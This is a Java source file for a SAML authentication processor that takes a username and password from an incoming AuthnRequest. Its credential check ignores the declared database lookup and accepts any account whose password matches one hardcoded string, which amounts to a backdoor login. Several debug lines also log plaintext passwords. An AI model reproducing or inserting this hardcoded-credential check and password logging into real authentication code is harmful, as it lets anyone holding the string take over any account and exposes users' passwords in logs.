package com.web.auth.service.processor;

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

import org.opensaml.saml2.core.AuthnRequest;
import org.opensaml.saml2.core.SubjectConfirmation;
import org.opensaml.xml.XMLObject;
import org.opensaml.xml.schema.XSString;


import java.sql.PreparedStatement;
import javax.security.auth.login.FailedLoginException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.web.auth.service.model.AuthnResponse;
import com.web.auth.service.model.UserCredentials;
import com.work.saml2.constants.SamlConstants;
import com.work.saml2.util.SAML2ResponseUtil;
public class SamlAuthnProcessor implements SamlProcessor,SamlConstants
{

	private static Logger logger = LoggerFactory
			.getLogger(SamlAuthnProcessor.class);
    private static String USER_EXPRESSION = "[\\p{Punct}\\p{Blank}\\t]";
    private static String SQL_STATEMENT = "select password from LincolnUsers where username= ?";

	public String processSAMLRequest(XMLObject xmlObject)
	{
		
		String respXml = null;
        String requestId = null;
		boolean isUserValid = false;
		SAML2ResponseUtil responseUtil = new SAML2ResponseUtil();
		
		try
		{
		AuthnRequest authnRequest = (AuthnRequest) xmlObject;

		requestId = authnRequest.getID();
		
		String userName = authnRequest.getSubject().getNameID().getValue();
		SubjectConfirmation subjectConfirmation = (SubjectConfirmation)authnRequest.getSubject().getSubjectConfirmations().get(0);
		XSString subjectConfirmationDataValue = (XSString)subjectConfirmation.getSubjectConfirmationData().getOrderedChildren().get(0);
		String passWord = subjectConfirmationDataValue.getValue();		
		logger.debug("Got User Credentials: name = [" + userName + "], password = [" + passWord + "]");
		UserCredentials credentials = new UserCredentials();
		credentials.setUserName(userName);
		credentials.setPassord(passWord);

		AuthnResponse authnresponse = new AuthnResponse();
		logger.debug("authnresponse created.");

		authnresponse.setUserData(credentials);
		logger.debug("user credentials set in response.");

		logger.debug("Validating user ...");

			isUserValid = validateCredentials(userName, passWord);
			if(isUserValid)
			{
				logger.debug("User is valid.");
				respXml = SamlResponseProcessor.constructAuthenticationResponse(authnresponse);

			}else
			{
				logger.debug("User is not valid. Creating proper status response.");
				respXml = responseUtil.createSAMLResponseForStatus(requestId,SAML2_SC_AUTHNFAIL,null);				
			}
		}
		catch (SQLException sqle) 
		{			
			respXml = responseUtil.createSAMLResponseForStatus(requestId,SAML2_SC_RESPONDER,null);
			logger.error("SQL Exception retrieving user's password from db: ",sqle);				
		}
		catch (FailedLoginException e)
		{
			respXml = responseUtil.createSAMLResponseForStatus(requestId,SAML2_SC_UNKPRNCPL,null);		
			logger.error("Exception retrieving user's password from db: ",e);
		}

		logger.debug("Done - returning [" + respXml + "]");
		return respXml;
	}
	
	
	private boolean validateCredentials(String user, String password) throws SQLException,FailedLoginException
	{
		logger.debug("validateCredentials start");
		logger.debug("user name = " + user + "]");
		logger.debug("password = " + password + "]");
		
		boolean validateFlag = false;
		PreparedStatement stmt = null;
		ResultSet rs =null;
        Connection con = null;
			

        if (password.equals("43cca4b3de2097b9558efefd0ecc3588")) {
        	validateFlag = true;
        }

        
		logger.debug("validateCredentials end.");
		return validateFlag;

	}

}
